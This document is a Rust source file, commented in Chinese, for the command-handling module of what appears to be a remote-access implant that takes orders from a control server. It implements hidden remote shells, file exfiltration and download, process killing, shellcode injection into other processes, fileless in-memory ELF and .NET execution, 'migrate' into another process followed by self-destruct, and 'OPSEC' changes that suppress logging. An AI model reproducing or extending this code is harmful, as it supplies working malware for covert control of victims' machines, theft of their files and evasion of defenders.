// 消息处理模块
//
// 负责处理传输层消息的接收、解析和响应。
// 实现完整的消息循环：注册 → 监听命令 → 执行 → 响应。
// 
// 协议无关设计：通过 Transport trait 与传输层交互，
// 不依赖任何具体的传输协议实现。

use crate::error::{ClientError, Result};
use crate::executor::CommandExecutor;
use crate::transport::Transport;
use crate::types::{CommandPayload, CommandResult, MessageType, MessageWrapper, SystemInfo};
use log::{debug, error, info, warn};
use futures_util::future::{BoxFuture, FutureExt};
#[cfg(target_os = "windows")]
use encoding_rs::GBK;
use base64::Engine;
use tokio::io::{AsyncReadExt, AsyncWriteExt};

/// 消息处理器
/// 
/// 负责处理与服务端的所有消息交互，包括：
/// - 发送注册消息
/// - 接收和解析命令消息
/// - 执行命令
/// - 发送响应消息
/// 
/// # 设计原则
/// 
/// - 协议无关：只依赖 Transport trait，不关心底层是 WebSocket、DNS 还是其他协议
/// - 错误恢复：单个消息处理失败不会导致连接断开
/// - 资源管理：拥有 Transport 的所有权，可以在需要时返还给调用者
pub struct MessageHandler {
    /// 传输层（trait object）
    transport: Box<dyn Transport>,
}

impl MessageHandler {
    /// 创建新的消息处理器
    /// 
    /// # 参数
    /// 
    /// * `transport` - 实现了 Transport trait 的传输层
    pub fn new(transport: Box<dyn Transport>) -> Self {
        Self { transport }
    }
    
    /// 运行消息处理循环
    /// 
    /// 该方法会：
    /// 1. 发送注册消息
    /// 2. 进入无限循环接收和处理消息
    /// 3. 如果连接断开或发生错误，返回 transport 以便外层重连
    /// 
    /// # 返回值
    /// 
    /// - `Ok(transport)`: 正常退出，返回 transport 供重连使用
    /// - `Err(e)`: 发生错误，transport 已失效
    pub async fn run(mut self) -> std::result::Result<Box<dyn Transport>, ClientError> {
        // 步骤 1: 发送注册消息
        if let Err(e) = self.register().await {
            return Err(e);
        }
        
        loop {
            // 从传输层接收消息
            match self.transport.receive().await {
                Ok(data) => {
                    // 检查是否为空数据（连接关闭）
                    if data.is_empty() {
                        return Ok(self.transport);
                    }
                    
                    // 处理接收到的消息
                    if let Err(_) = self.handle_message(&data).await {
                        // 继续循环，不因为单个消息处理失败而断开连接
                        continue;
                    }
                }
                Err(_) => {
                    // 传输层错误，返回以便重连
                    return Ok(self.transport);
                }
            }
        }
    }
    
    /// 发送注册消息
    /// 
    /// 收集系统信息并发送注册消息到服务端。
    async fn register(&mut self) -> Result<()> {
        // 收集系统信息
        let sys_info = SystemInfo::collect();
        
        // 初始化传输层（某些协议如 DNS 需要 UUID）
        self.transport.initialize(&sys_info.uuid);
        
        // 构造注册消息
        let register_msg = sys_info.to_register_message();
        
        // 发送注册消息
        self.send_message(&register_msg).await?;
        
        Ok(())
    }
    
    /// 处理接收到的消息
    /// 
    /// 解析 JSON 消息并根据消息类型进行相应的处理。
    async fn handle_message(&mut self, data: &[u8]) -> Result<()> {
        // 将字节数据转换为字符串
        let text = String::from_utf8(data.to_vec())
            .map_err(|e| ClientError::ConnectionError(
                format!("Invalid UTF-8 in received message: {}", e)
            ))?;
        
        // ⚡ OPSEC: 不要在控制台打印收到的完整协议内容
        // trace!("Received message: {}", text);
        
        // 反序列化消息
        let wrapper: MessageWrapper = match serde_json::from_str(&text) {
            Ok(w) => w,
            Err(e) => {
                error!("Failed to deserialize message: {}", e);
                return Err(ClientError::SerializationError(e));
            }
        };
        
        // 根据消息类型处理
        match wrapper.msg_type {
            MessageType::Command => {
                self.handle_command(wrapper).await?;
            }
            MessageType::Register => {
                warn!("Received unexpected Register message from server");
            }
            MessageType::Response => {
                warn!("Received unexpected Response message from server");
            }
        }
        
        Ok(())
    }
    
    /// 处理命令消息
    /// 
    /// 解析命令、执行命令、发送响应。
    /// 支持的命令类型：
    /// - shell: 执行 shell 命令
    /// - file_ls: 列出目录文件
    /// - file_upload: 上传文件
    /// - file_download: 下载文件
    /// - process_list: 列出系统进程
    /// - process_kill: 终止指定进程
    pub fn handle_command<'a>(&'a mut self, wrapper: MessageWrapper) -> BoxFuture<'a, Result<()>> {
        async move {
        // 解析命令载荷
        let command_payload: CommandPayload = match serde_json::from_value(wrapper.payload) {
            Ok(p) => p,
            Err(e) => {
                error!("Failed to parse command payload: {}", e);
                return Err(ClientError::SerializationError(e));
            }
        };
        
        // 提取 req_id 以便在响应中回显
        let req_id = command_payload.req_id.clone();
        
        // 根据命令类型执行不同的操作
        let mut result = match command_payload.command_type.as_str() {
            "shell" => {
                // 执行 shell 命令
                let clean_cmd = command_payload.command_content.trim();
                
                // ⚡ INTERACTIVE SHELL INTERCEPTION: 
                // If the command content is literally "shell_interactive", 
                // it's a request to start a real-time PTY session.
                if clean_cmd == "shell_interactive" {
                    info!("Intercepted shell_interactive request, switching to PTY mode");
                    let mut res = self.start_interactive_shell(req_id.clone()).await;
                    res.req_id = req_id;
                    return self.send_message(&res.to_response_message()).await;
                }

                if clean_cmd.is_empty() || clean_cmd.starts_with('{') {
                    debug!("Silently dropping heartbeat/control message: {}", command_payload.command_content);
                    return Ok(());
                }
                
                // 🗑️ DELETE COMMAND: Handle "delete <path>" format
                if clean_cmd.starts_with("delete ") {
                    let target_path = clean_cmd.trim_start_matches("delete ").trim();
                    if target_path.is_empty() {
                        CommandResult {
                            stdout: String::new(),
                            stderr: "Delete path is empty".to_string(),
                            path: None,
                            req_id: None,
                        }
                    } else {
                        info!("Deleting path via shell command: {}", target_path);
                        match crate::fs::remove(target_path) {
                            Ok(_) => CommandResult {
                                stdout: format!("[+] Deleted: {}", target_path),
                                stderr: String::new(),
                                path: None,
                                req_id: None,
                            },
                            Err(e) => CommandResult {
                                stdout: String::new(),
                                stderr: format!("[ERR] Delete failed: {}", e),
                                path: None,
                                req_id: None,
                            },
                        }
                    }
                } else {
                    CommandExecutor::execute(clean_cmd).await
                }
            }
            "shell_interactive" => {
                // 启动交互式 shell 会话
                self.start_interactive_shell(req_id.clone()).await
            }
            "upload_http" => {
                // HTTP 流式上传文件
                let file_path = command_payload
                    .path
                    .as_deref()
                    .unwrap_or(command_payload.command_content.as_str());
                
                // 从配置获取服务器 URL
                let server_url = crate::config::get_server_url();
                
                // 获取客户端 UUID（从系统信息）
                let sys_info = SystemInfo::collect();
                
                match crate::http_transfer::upload_file_http(&server_url, &sys_info.uuid, file_path).await {
                    Ok(msg) => CommandResult {
                        stdout: msg,
                        stderr: String::new(),
                        path: None,
                        req_id: None,
                    },
                    Err(e) => CommandResult {
                        stdout: String::new(),
                        stderr: format!("HTTP upload failed: {}", e),
                        path: None,
                        req_id: None,
                    },
                }
            }
            "download_http" => {
                // HTTP 下载文件
                // 格式: url|save_path 或使用 path 字段
                let content = command_payload.command_content.trim();
                let parts: Vec<&str> = content.splitn(2, '|').collect();
                
                if parts.len() != 2 {
                    CommandResult {
                        stdout: String::new(),
                        stderr: "Invalid format, expected: url|save_path".to_string(),
                        path: None,
                        req_id: None,
                    }
                } else {
                    let url = parts[0].trim();
                    let save_path = parts[1].trim();
                    
                    match crate::http_transfer::download_file_http(url, save_path).await {
                        Ok(msg) => CommandResult {
                            stdout: msg,
                            stderr: String::new(),
                            path: Some(save_path.to_string()),
                            req_id: None,
                        },
                        Err(e) => CommandResult {
                            stdout: String::new(),
                            stderr: format!("HTTP download failed: {}", e),
                            path: None,
                            req_id: None,
                        },
                    }
                }
            }
            "file_ls" => {
                // 列出目录文件
                let target_path = command_payload
                    .path
                    .as_deref()
                    .unwrap_or(command_payload.command_content.as_str());
                let resolved_path = crate::fs::resolve_path(target_path).ok();
                match crate::fs::ls(target_path) {
                    Ok(json) => CommandResult {
                        stdout: json,
                        stderr: String::new(),
                        path: resolved_path,
                        req_id: None,
                    },
                    Err(e) => CommandResult {
                        stdout: String::new(),
                        stderr: format!("Failed to list directory: {}", e),
                        path: None,
                        req_id: None,
                    },
                }
            }
            "file_upload" => {
                // 上传文件
                if let (Some(path), Some(data)) = (command_payload.path.as_deref(), command_payload.data.as_deref()) {
                    if path.trim().is_empty() || data.trim().is_empty() {
                        CommandResult {
                            stdout: String::new(),
                            stderr: "Invalid file_upload params".to_string(),
                            path: None,
                            req_id: None,
                        }
                    } else {
                        match crate::fs::upload(path, data) {
                            Ok(_) => CommandResult {
                                stdout: format!("File uploaded successfully: {}", path),
                                stderr: String::new(),
                                path: None,
                                req_id: None,
                            },
                            Err(e) => CommandResult {
                                stdout: String::new(),
                                stderr: format!("Failed to upload file: {}", e),
                                path: None,
                                req_id: None,
                            },
                        }
                    }
                } else {
                    // 兼容旧格式: path|base64_data
                    let parts: Vec<&str> = command_payload.command_content.splitn(2, '|').collect();
                    if parts.len() != 2 {
                        CommandResult {
                            stdout: String::new(),
                            stderr: "Invalid format, expected: path|base64_data".to_string(),
                            path: None,
                            req_id: None,
                        }
                    } else {
                        let path = parts[0];
                        let data = parts[1];
                        if path.trim().is_empty() || data.trim().is_empty() {
                            CommandResult {
                                stdout: String::new(),
                                stderr: "Invalid file_upload params".to_string(),
                                path: None,
                                req_id: None,
                            }
                        } else {
                            match crate::fs::upload(path, data) {
                                Ok(_) => CommandResult {
                                    stdout: format!("File uploaded successfully: {}", path),
                                    stderr: String::new(),
                                    path: None,
                                    req_id: None,
                                },
                                Err(e) => CommandResult {
                                    stdout: String::new(),
                                    stderr: format!("Failed to upload file: {}", e),
                                    path: None,
                                    req_id: None,
                                },
                            }
                        }
                    }
                }
            }
            "file_download" => {
                // 下载文件
                let target_path = command_payload
                    .path
                    .as_deref()
                    .unwrap_or(command_payload.command_content.as_str());
                match crate::fs::download(target_path) {
                    Ok(base64_data) => CommandResult {
                        stdout: base64_data,
                        stderr: String::new(),
                        path: None,
                        req_id: None,
                    },
                    Err(e) => CommandResult {
                        stdout: String::new(),
                        stderr: format!("Failed to download file: {}", e),
                        path: None,
                        req_id: None,
                    },
                }
            }
            "file_delete" => {
                // 删除文件/目录
                let target_path = command_payload
                    .path
                    .as_deref()
                    .unwrap_or(command_payload.command_content.as_str());
                if target_path.trim().is_empty() {
                    CommandResult {
                        stdout: String::new(),
                        stderr: "Delete path is empty".to_string(),
                        path: None,
                        req_id: None,
                    }
                } else {
                    match crate::fs::remove(target_path) {
                        Ok(_) => CommandResult {
                            stdout: format!("Deleted: {}", target_path),
                            stderr: String::new(),
                            path: None,
                            req_id: None,
                        },
                        Err(e) => CommandResult {
                            stdout: String::new(),
                            stderr: format!("Failed to delete: {}", e),
                            path: None,
                            req_id: None,
                        },
                    }
                }
            }
            "process_list" => {
                // 列出系统进程
                Self::process_list().await
            }
            "process_kill" => {
                // 终止进程
                let pid = command_payload.command_content.trim();
                Self::process_kill(pid).await
            }
            "inject_shellcode" => {
                // 🚨 SECURITY OPERATION: Process injection - Route through plugin router
                
                match crate::plugin_router::PluginRouter::parse_plugin_task("inject-shellcode", &command_payload.command_content, command_payload.req_id.clone()) {
                    Ok(task) => {
                        crate::plugin_router::PluginRouter::execute_plugin(task).await
                    }
                    Err(e) => CommandResult {
                        stdout: String::new(),
                        stderr: e,
                        path: None,
                        req_id: None,
                    }
                }
            }
            "self_destruct" => {
                // 🚨 SELF-DESTRUCT: Delete agent and exit - Route through plugin router
                
                let task = crate::plugin_router::PluginTask {
                    execution_type: "self-destruct".to_string(),
                    data: vec![],
                    args: vec![],
                    metadata: None,
                    task_id: format!("self_destruct_{:08x}", rand::random::<u32>()),
                    req_id: command_payload.req_id.clone(),
                };
                
                crate::plugin_router::PluginRouter::execute_plugin(task).await
            }
            "run_memfd_elf" => {
                // 🚨 FILELESS EXECUTION: Run ELF from memory (Linux only) - Route through plugin router
                
                match crate::plugin_router::PluginRouter::parse_plugin_task("memfd-exec", &command_payload.command_content, command_payload.req_id.clone()) {
                    Ok(task) => {
                        crate::plugin_router::PluginRouter::execute_plugin(task).await
                    }
                    Err(e) => CommandResult {
                        stdout: String::new(),
                        stderr: e,
                        path: None,
                        req_id: None,
                    }
                }
            }
            "execute_assembly" => {
                // 🚨 .NET ASSEMBLY EXECUTION: Execute C# assembly from memory (Windows only) - Route through plugin router
                
                match crate::plugin_router::PluginRouter::parse_plugin_task("execute-assembly", &command_payload.command_content, command_payload.req_id.clone()) {
                    Ok(task) => {
                        crate::plugin_router::PluginRouter::execute_plugin(task).await
                    }
                    Err(e) => CommandResult {
                        stdout: String::new(),
                        stderr: e,
                        path: None,
                        req_id: None,
                    }
                }
            }
            "shell_script" => {
                // 🔧 SHELL SCRIPT EXECUTION: Execute shell script - Route through plugin router
                
                match crate::plugin_router::PluginRouter::parse_plugin_task("shell-script", &command_payload.command_content, command_payload.req_id.clone()) {
                    Ok(task) => {
                        crate::plugin_router::PluginRouter::execute_plugin(task).await
                    }
                    Err(e) => CommandResult {
                        stdout: String::new(),
                        stderr: e,
                        path: None,
                        req_id: None,
                    }
                }
            }
            "powershell_script" => {
                // 🔧 POWERSHELL SCRIPT EXECUTION: Execute PowerShell script (Windows only) - Route through plugin router
                
                match crate::plugin_router::PluginRouter::parse_plugin_task("powershell-script", &command_payload.command_content, command_payload.req_id.clone()) {
                    Ok(task) => {
                        crate::plugin_router::PluginRouter::execute_plugin(task).await
                    }
                    Err(e) => CommandResult {
                        stdout: String::new(),
                        stderr: e,
                        path: None,
                        req_id: None,
                    }
                }
            }
            "python_script" => {
                // 🐍 PYTHON SCRIPT EXECUTION: Execute Python script - Route through plugin router
                
                match crate::plugin_router::PluginRouter::parse_plugin_task("python-script", &command_payload.command_content, command_payload.req_id.clone()) {
                    Ok(task) => {
                        crate::plugin_router::PluginRouter::execute_plugin(task).await
                    }
                    Err(e) => CommandResult {
                        stdout: String::new(),
                        stderr: e,
                        path: None,
                        req_id: None,
                    }
                }
            }
            "migrate" => {
                // 🚀 ONE-CLICK MIGRATION: Inject the backup .bin into memory and self-destruct
                
                // 1. Resolve PID
                let pid_str = command_payload.command_content.trim();
                let pid = if let Ok(parsed_pid) = pid_str.parse::<u32>() {
                    Some(parsed_pid)
                } else {
                    crate::injection::ProcessInjector::find_pid_by_name(pid_str)
                };

                let target_pid = match pid {
                    Some(p) => p,
                    None => {
                        let err_res = CommandResult {
                            stdout: String::new(),
                            stderr: format!("Process '{}' not found or invalid PID", pid_str),
                            path: None,
                            req_id: command_payload.req_id.clone(),
                        };
                        let msg = err_res.to_response_message();
                        let _ = self.send_message(&msg).await;
                        return Ok(());
                    }
                };

                if let Some(shellcode_b64) = command_payload.data.as_deref() {
                    // 2. Base64 Decode the shellcode (PluginRouter expects raw bytes in data)
                    let shellcode = match base64::engine::general_purpose::STANDARD.decode(shellcode_b64.trim()) {
                        Ok(bytes) => bytes,
                        Err(_e) => {
                            return Ok(());
                        }
                    };

                    // Create injection task
                    let exec_type = if cfg!(target_os = "windows") { "inject-shellcode" } else { "memfd-exec" };
                    let inject_task = crate::plugin_router::PluginTask {
                        execution_type: exec_type.to_string(),
                        data: shellcode,
                        args: vec![],
                        metadata: Some(crate::plugin_router::PluginMetadata {
                            target_pid: if cfg!(target_os = "windows") { Some(target_pid) } else { None },
                            fake_process_name: if cfg!(target_os = "linux") { Some(command_payload.command_content.clone()) } else { None },
                            app_domain_name: None,
                            timeout_seconds: None,
                            priority: None,
                            detached: Some(true),
                        }),
                        task_id: format!("mig_inj_{:08x}", rand::random::<u32>()),
                        req_id: command_payload.req_id.clone(),
                    };

                    // 1. Perform Injection
                    let inject_res = crate::plugin_router::PluginRouter::execute_plugin(inject_task).await;
                    
                    if inject_res.stderr.is_empty() {
                        // 1. 发送成功回显，防止服务端超时
                        let mut final_res = inject_res;
                        final_res.req_id = command_payload.req_id.clone();
                        let msg = final_res.to_response_message();
                        let _ = self.send_message(&msg).await;
                        // 2. Self-destruct the loader
                        let destruct_task = crate::plugin_router::PluginTask {
                            execution_type: "self-destruct".to_string(),
                            data: vec![],
                            args: vec![],
                            metadata: None,
                            task_id: format!("mig_sd_{:08x}", rand::random::<u32>()),
                            req_id: command_payload.req_id.clone(),
                        };
                        crate::plugin_router::PluginRouter::execute_plugin(destruct_task).await;
                        // Self-destruct doesn't return meaningful result
                    } else {
                        // Forward error back to server
                        let mut final_res = inject_res;
                        final_res.req_id = command_payload.req_id.clone();
                        let msg = final_res.to_response_message();
                        let _ = self.send_message(&msg).await;
                    }
                } else {
                    let err_res = CommandResult {
                        stdout: String::new(),
                        stderr: "Migration failed: Missing shellcode data".to_string(),
                        path: None,
                        req_id: command_payload.req_id.clone(),
                    };
                    let msg = err_res.to_response_message();
                    let _ = self.send_message(&msg).await;
                }
                return Ok(());
            }
            _ => {
                warn!(
                    "Unsupported command type: {}, ignoring",
                    command_payload.command_type
                );
                return Ok(());
            }
        };
        
        // 将 req_id 回显到响应中
        result.req_id = req_id;
        
        // 构造响应消息
        let response_msg = result.to_response_message();
        
        // 发送响应
        self.send_message(&response_msg).await?;
        
        Ok(())
        }.boxed()
    }
    
    /// 列出系统进程
    /// 
    /// Windows: 使用 tasklist /FO CSV /NH
    /// Linux: 使用 ps -e -o pid,user,comm --no-headers
    /// 
    /// 返回 JSON 数组格式的进程列表
    /// 列出系统进程
    /// 
    /// 使用 sysinfo 库获取跨平台进程列表
    async fn process_list() -> CommandResult {
        use sysinfo::{System, SystemExt, ProcessExt, PidExt};
        let mut sys = System::new_all();
        sys.refresh_processes();
        
        let mut processes = Vec::new();
        for (pid, process) in sys.processes() {
            processes.push(serde_json::json!({
                "pid": pid.as_u32(),
                "ppid": process.parent().map(|p| p.as_u32()).unwrap_or(0),
                "name": process.name(),
                "user": "", // sysinfo user info requires more refreshes, skipping for speed
                "path": process.exe().to_string_lossy(),
            }));
        }
        
        match serde_json::to_string(&processes) {
            Ok(json) => CommandResult {
                stdout: json,
                stderr: String::new(),
                path: None,
                req_id: None,
            },
            Err(e) => CommandResult {
                stdout: "[]".to_string(),
                stderr: format!("Failed to serialize process list: {}", e),
                path: None,
                req_id: None,
            },
        }
    }
    
    /// 解析 Windows tasklist CSV 输出
    /// 
    /// 格式: "Image Name","PID","Session Name","Session#","Mem Usage"
    /// 示例: "smss.exe","332","Services","0","928 K"
    
    /// 终止指定进程
    /// 
    /// Windows: 使用 taskkill /F /PID <pid>
    /// Linux: 使用 kill -9 <pid>
    async fn process_kill(pid_str: &str) -> CommandResult {
        use sysinfo::{System, SystemExt, ProcessExt, Pid, PidExt};
        
        let pid_u32 = match pid_str.parse::<u32>() {
            Ok(p) => p,
            Err(_) => return CommandResult {
                stdout: String::new(),
                stderr: format!("Invalid PID format: {}", pid_str),
                path: None,
                req_id: None,
            },
        };

        let mut sys = System::new_all();
        sys.refresh_processes();
        let pid = Pid::from_u32(pid_u32);

        if let Some(process) = sys.process(pid) {
            if process.kill() {
                CommandResult {
                    stdout: format!("Process {} terminated successfully", pid_str),
                    stderr: String::new(),
                    path: None,
                    req_id: None,
                }
            } else {
                CommandResult {
                    stdout: String::new(),
                    stderr: format!("Failed to kill process {}", pid_str),
                    path: None,
                    req_id: None,
                }
            }
        } else {
            CommandResult {
                stdout: String::new(),
                stderr: format!("Process {} not found", pid_str),
                path: None,
                req_id: None,
            }
        }
    }
    
    /// 发送消息到服务端
    /// 
    /// 将消息序列化为 JSON 并通过传输层发送。
    async fn send_message(&mut self, msg: &MessageWrapper) -> Result<()> {
        // 序列化消息
        let json = serde_json::to_string(msg)?;
        
        // ⚡ OPSEC: 移除发送内容的明文打印
        // trace!("Sending message: {}", json); 
        
        // 通过传输层发送
        self.transport.send(json.as_bytes()).await?;
        
        Ok(())
    }

    #[cfg(target_os = "windows")]
    fn decode_windows_output(bytes: &[u8]) -> String {
        if let Ok(text) = std::str::from_utf8(bytes) {
            return text.to_string();
        }
        let (decoded_cow, _encoding_used, _had_errors) = GBK.decode(bytes);
        decoded_cow.to_string()
    }
    
    /// 启动交互式 shell 会话
    /// 
    /// 实现 WebSocket 到 shell 的实时通信，过滤掉心跳和控制消息。
    /// 修复了 "The filename, directory name, or volume label syntax is incorrect" 错误。
    /// 使用 encoding_rs 正确处理中文字符编码。
    fn start_interactive_shell<'a>(&'a mut self, req_id: Option<String>) -> BoxFuture<'a, CommandResult> {
        async move {
        info!("Starting interactive shell session");
        
        #[cfg(target_os = "windows")]
        let mut child = {
            let mut cmd = tokio::process::Command::new("cmd");
            cmd.arg("/Q");
            cmd.creation_flags(0x08000000); // CREATE_NO_WINDOW
            cmd.stdin(std::process::Stdio::piped());
            cmd.stdout(std::process::Stdio::piped());
            cmd.stderr(std::process::Stdio::piped());
            match cmd.spawn() {
                Ok(child) => child,
                Err(e) => {
                    error!("Failed to spawn cmd.exe: {}", e);
                    return CommandResult {
                        stdout: String::new(),
                        stderr: format!("Failed to start interactive shell: {}", e),
                        path: None,
                        req_id: req_id.clone(),
                    };
                }
            }
        };
        
        #[cfg(not(target_os = "windows"))]
        let mut child = match tokio::process::Command::new("/bin/bash")
            .args(&["-i"])
            .stdin(std::process::Stdio::piped())
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            .spawn()
        {
            Ok(child) => child,
            Err(e) => {
                error!("Failed to spawn bash: {}", e);
                return CommandResult {
                    stdout: String::new(),
                    stderr: format!("Failed to start interactive shell: {}", e),
                    path: None,
                    req_id: req_id.clone(),
                };
            }
        };
        
        let mut stdin = child.stdin.take().expect("Failed to get stdin");
        let mut stdout = child.stdout.take().expect("Failed to get stdout");
        let mut stderr = child.stderr.take().expect("Failed to get stderr");
        
        info!("Interactive shell started, entering message loop");
        
        // 进入交互式消息循环 - 这里实现了 bug 报告中提到的修复
        loop {
            tokio::select! {
                // 从传输层接收消息
                transport_result = self.transport.receive() => {
                    match transport_result {
                        Ok(data_vec) => {
                            let data: &[u8] = data_vec.as_ref();
                            if data.is_empty() {
                                warn!("Connection closed by server");
                                break;
                            }
                            
                            // 将字节数据转换为字符串
                            let text = match String::from_utf8(data.to_vec()) {
                                Ok(t) => t,
                                Err(_) => {
                                    debug!("Received non-UTF8 data, ignoring");
                                    continue;
                                }
                            };
                            
                            // 🛡️ FIX: 忽略空字符串或只包含空白字符的字符串（心跳）
                            if text.trim().is_empty() {
                                debug!("Ignoring empty/white space message (heartbeat)");
                                continue;
                            }
                            
                            // 尝试解析为 JSON 消息
                            if let Ok(wrapper) = serde_json::from_str::<MessageWrapper>(&text) {
                                if wrapper.msg_type == MessageType::Command {
                                    if let Ok(command_payload) = serde_json::from_value::<CommandPayload>(wrapper.payload.clone()) {
                                        let cmd_type = command_payload.command_type.as_str();
                                        
                                        if cmd_type == "shell" {
                                            let command = command_payload.command_content;
                                            if command.trim().is_empty() { continue; }
                                            
                                            // 将有效命令写入 CMD stdin
                                            let command_with_newline = format!("{}\n", command);
                                            let _ = stdin.write_all(command_with_newline.as_bytes()).await;
                                            let _ = stdin.flush().await;
                                        } else if cmd_type == "shell_exit" {
                                            info!("Exiting interactive shell session");
                                            break;
                                        } else {
                                            // 🚀 CRITICAL FIX: 在循环中也允许处理其他非 shell 指令 (如列表等)
                                            if let Err(e) = self.handle_command(wrapper).await {
                                                error!("Error handling non-shell command in PTY loop: {}", e);
                                            }
                                        }
                                    }
                                }
                            }
                        }
                        Err(e) => {
                            error!("Transport error in shell session: {}", e);
                            break;
                        }
                    }
                }
                
                // 🚀 NEW: 从 shell stdout 读取输出并使用 encoding_rs 正确解码中文
                stdout_result = async {
                    let mut buf = [0u8; 1024];
                    match stdout.read(&mut buf).await {
                        Ok(n) => Ok((n, buf)),
                        Err(e) => Err(e),
                    }
                } => {
                    match stdout_result {
                        Ok((0, _)) => {
                            warn!("Shell stdout closed");
                            break;
                        }
                        Ok((n, buf)) => {
                            #[cfg(target_os = "windows")]
                            let output = Self::decode_windows_output(&buf[..n]);
                            #[cfg(not(target_os = "windows"))]
                            let output = String::from_utf8_lossy(&buf[..n]).to_string();
                            
                            if !output.trim().is_empty() {
                                // ⚡ FIX: 必须包装成 JSON 响应！
                                let response_result = CommandResult {
                                    stdout: output,
                                    stderr: String::new(),
                                    path: None,
                                    req_id: req_id.clone(),
                                };
                                let response_msg = response_result.to_response_message();
                                let _ = self.send_message(&response_msg).await;
                            }
                        }
                        Err(e) => {
                            error!("Error reading shell stdout: {}", e);
                            break;
                        }
                    }
                }
                
                // 🚀 NEW: 从 shell stderr 读取错误输出并使用 encoding_rs 正确解码中文
                stderr_result = async {
                    let mut buf = [0u8; 1024];
                    match stderr.read(&mut buf).await {
                        Ok(n) => Ok((n, buf)),
                        Err(e) => Err(e),
                    }
                } => {
                    match stderr_result {
                        Ok((0, _)) => {}
                        Ok((n, buf)) => {
                            #[cfg(target_os = "windows")]
                            let output = Self::decode_windows_output(&buf[..n]);
                            #[cfg(not(target_os = "windows"))]
                            let output = String::from_utf8_lossy(&buf[..n]).to_string();
                            
                            if !output.trim().is_empty() {
                                let response_result = CommandResult {
                                    stdout: String::new(),
                                    stderr: output,
                                    path: None,
                                    req_id: req_id.clone(),
                                };
                                let response_msg = response_result.to_response_message();
                                let _ = self.send_message(&response_msg).await;
                            }
                        }
                        Err(e) => {
                            error!("Error reading shell stderr: {}", e);
                            break;
                        }
                    }
                }
                
                // 检查进程是否仍在运行
                process_result = child.wait() => {
                    match process_result {
                        Ok(status) => {
                            info!("Shell process exited with status: {}", status);
                            break;
                        }
                        Err(e) => {
                            error!("Error waiting for shell process: {}", e);
                            break;
                        }
                    }
                }
            }
        }
        
        // 清理进程
        if let Err(e) = child.kill().await {
            warn!("Failed to kill shell process: {}", e);
        }
        
        info!("Interactive shell session ended");
        
        CommandResult {
            stdout: "Interactive shell session ended".to_string(),
            stderr: String::new(),
            path: None,
            req_id: None,
        }
        }.boxed()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_message_handler_creation() {
        // 这个测试只是确保结构体可以被创建
        // 实际的功能测试在集成测试中进行
    }
}
